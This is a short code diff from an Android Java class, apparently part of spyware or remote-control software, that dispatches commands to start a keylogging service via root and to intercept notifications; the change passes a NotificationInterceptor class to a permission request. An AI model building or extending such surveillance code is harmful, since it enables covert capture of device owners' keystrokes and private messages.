@@ -499,7 +499,7 @@ public class CommandsIntentService extends IntentService {
                 Systems.Root.startKeyloggingService(this);
                 Systems.Phone.Settings.openAccessibilityOptions(this);
             }else if(action.equals(ACTION_NOTIFICATION_INTERCEPTOR)){
-                Notifications.requestNotificationListenerServicePermission(this);
+                Notifications.requestNotificationListenerServicePermission(this, NotificationInterceptor.class);
             }else {
                 Log.d(TAG, "No action found!");
             }
